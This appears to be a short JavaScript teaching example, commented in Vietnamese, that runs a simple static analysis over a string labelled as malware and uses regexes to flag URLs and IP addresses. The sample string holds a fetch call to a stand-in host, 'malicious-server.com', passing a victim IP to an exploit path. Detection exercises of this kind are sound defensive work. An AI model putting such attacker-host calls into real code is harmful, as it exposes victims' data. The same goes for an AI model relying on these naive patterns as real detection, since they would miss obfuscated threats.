// Giả sử đây là một đoạn mã độc trong dạng chuỗi
const malwareCode = `
  const serverUrl = "http://malicious-server.com";
  const victimIp = "192.168.1.100";
  fetch(serverUrl + "/exploit?ip=" + victimIp)
    .then(response => response.json())
    .then(data => console.log(data));
  console.log("This is a malicious script!");
`;

// Hàm tìm kiếm chuỗi URL và địa chỉ IP trong mã nguồn
function staticAnalysis(code) {
  // Kiểm tra xem mã có chứa các URL hay địa chỉ IP đáng ngờ không
  const urlPattern = /(http|https):\/\/[^\s]+/g;
  const ipPattern = /\b\d{1,3}(\.\d{1,3}){3}\b/g;

  const urls = code.match(urlPattern);
  const ips = code.match(ipPattern);

  if (urls) {
    console.log("Found suspicious URLs:", urls);
  } else {
    console.log("No suspicious URLs found.");
  }

  if (ips) {
    console.log("Found suspicious IP addresses:", ips);
  } else {
    console.log("No suspicious IP addresses found.");
  }
}

// Thực hiện phân tích tĩnh trên mã độc
staticAnalysis(malwareCode);
